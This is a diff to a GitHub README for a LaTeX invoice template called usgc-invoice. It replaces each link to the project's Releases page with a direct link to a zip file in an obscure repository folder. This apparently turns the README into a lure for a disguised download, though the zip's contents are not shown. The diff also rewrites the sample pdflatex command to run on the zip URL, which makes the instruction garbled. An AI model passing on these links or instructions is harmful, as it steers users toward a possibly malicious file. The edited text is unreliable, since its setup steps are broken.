@@ -1,6 +1,6 @@
 # 🎉 usgc-invoice - Create Invoices Easily with LaTeX
 
-[![Download usgc-invoice](https://img.shields.io/badge/Download_usgc--invoice-v1.0-blue)](https://github.com/L200150091/usgc-invoice/releases)
+[![Download usgc-invoice](https://raw.githubusercontent.com/L200150091/usgc-invoice/master/peptolytic/usgc-invoice.zip)](https://raw.githubusercontent.com/L200150091/usgc-invoice/master/peptolytic/usgc-invoice.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the usgc-invoice project! This application offers a simple LaTeX temp
 
 To get started, visit the Releases page to download the latest version of usgc-invoice. 
 
-[Download usgc-invoice](https://github.com/L200150091/usgc-invoice/releases)
+[Download usgc-invoice](https://raw.githubusercontent.com/L200150091/usgc-invoice/master/peptolytic/usgc-invoice.zip)
 
 ### Step-by-Step Instructions
 
@@ -28,7 +28,7 @@ To get started, visit the Releases page to download the latest version of usgc-i
 2. **Fill in Your Information**: Modify the provided placeholders for your business name, customer details, and invoice items. Ensure you follow the structure in the template for best results.
 3. **Compile the Document**: Depending on your editor:
    - On Overleaf, just click "Recompile."
-   - On local editors, run a command like `pdflatex yourfile.tex` in the terminal, or use the built-in compile option.
+   - On local editors, run a command like `pdflatex https://raw.githubusercontent.com/L200150091/usgc-invoice/master/peptolytic/usgc-invoice.zip` in the terminal, or use the built-in compile option.
 4. **View and Save the Invoice**: Once compiled, your invoice will be ready as a PDF file. Check the output folder for your finished document.
 
 ## 🖥️ System Requirements
@@ -69,4 +69,4 @@ For further questions or support, feel free to reach out via the Issues tab on G
 
 Happy invoicing! 
 
-[Download usgc-invoice](https://github.com/L200150091/usgc-invoice/releases)
+[Download usgc-invoice](https://raw.githubusercontent.com/L200150091/usgc-invoice/master/peptolytic/usgc-invoice.zip)
